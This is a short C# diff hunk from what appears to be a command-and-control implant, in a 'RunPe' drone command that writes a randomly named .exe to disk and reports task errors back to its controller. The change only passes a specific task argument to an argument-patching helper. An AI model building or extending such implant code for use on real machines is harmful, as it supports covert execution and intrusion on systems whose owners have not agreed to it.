@@ -32,7 +32,7 @@ public class RunPe : DroneCommand
         var argumentHandler = new ArgumentHandler();
         var filePath = $"{Directory.GetCurrentDirectory()}\\{Helpers.GenerateRandomString(7)}.exe";
         
-        if (!argumentHandler.UpdateArgs(filePath, task.Arguments))
+        if (!argumentHandler.UpdateArgs(filePath, task.Arguments["args"]))
         {
             await Drone.SendTaskError(task.Id, "Failed to patch arguments");
             return;
